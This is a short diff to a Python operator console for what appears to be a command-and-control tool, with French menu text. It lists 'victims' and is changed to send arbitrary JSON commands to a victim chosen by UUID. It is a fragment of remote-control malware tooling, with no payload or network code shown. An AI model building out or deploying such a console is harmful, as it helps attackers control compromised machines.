@@ -24,7 +24,7 @@ def operator_loop(send_func):
     while True:
         print("\n=== MENU OPERATEUR ===")
         print("1) Lister les victimes")
-        print("2) Envoyer une commande 'cmd'")
+        print("2) Envoyer une commande JSON")
         print("3) Quitter")
 
         choice = input("> ").strip()
@@ -39,12 +39,14 @@ def operator_loop(send_func):
 
         elif choice == "2":
             uuid = input("UUID de la victime : ").strip()
-            cmd = input("Commande à exécuter (symbolique) : ").strip()
+            raw = input("Commande JSON : ").strip()
 
-            message = {
-                "type": "cmd",
-                "command": cmd,
-            }
+            try:
+                message = json.loads(raw)
+            except Exception:
+                print("[ERROR] JSON invalide")
+                continue
+
             send_func(uuid, message)
 
         elif choice == "3":
